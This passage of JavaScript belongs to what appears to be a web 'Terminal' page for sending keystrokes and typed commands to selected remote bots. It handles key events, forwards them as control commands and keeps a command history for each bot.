  if (!modal || !modal.classList.contains('show')) return;
  if (e.key === 'Escape') return;
  e.preventDefault();
  if (e.key === 'Enter') sendControlCmd('key enter');
  else if (e.key === 'Backspace') sendControlCmd('key backspace');
  else if (e.key === 'Tab') sendControlCmd('key tab');
  else if (e.key === 'ArrowUp') sendControlCmd('key up');
  else if (e.key === 'ArrowDown') sendControlCmd('key down');
  else if (e.key === 'ArrowLeft') sendControlCmd('key left');
  else if (e.key === 'ArrowRight') sendControlCmd('key right');
  else if (e.key.length === 1) sendControlCmd('type ' + e.key);
});

document.getElementById('cmdInput').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') sendCmd();
});

document.getElementById('cmdInput').addEventListener('keydown', function(e) {
  if (!selectedBot) return;
  var hist = cmdHistory[selectedBot] || [];
  if (hist.length === 0) return;
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    var idx = historyIndex[selectedBot] === undefined ? hist.length : historyIndex[selectedBot];
    idx = Math.max(0, idx - 1);
    historyIndex[selectedBot] = idx;
    this.value = hist[idx] || '';
  } else if (e.key === 'ArrowDown') {
    e.preventDefault();
    var idx = historyIndex[selectedBot] === undefined ? hist.length : historyIndex[selectedBot];
    idx = Math.min(hist.length, idx + 1);
    historyIndex[selectedBot] = idx;
    this.value = idx >= hist.length ? '' : (hist[idx] || '');
  }
});
</script>
`;

  return getLayout("Terminal", content, "terminal");
}
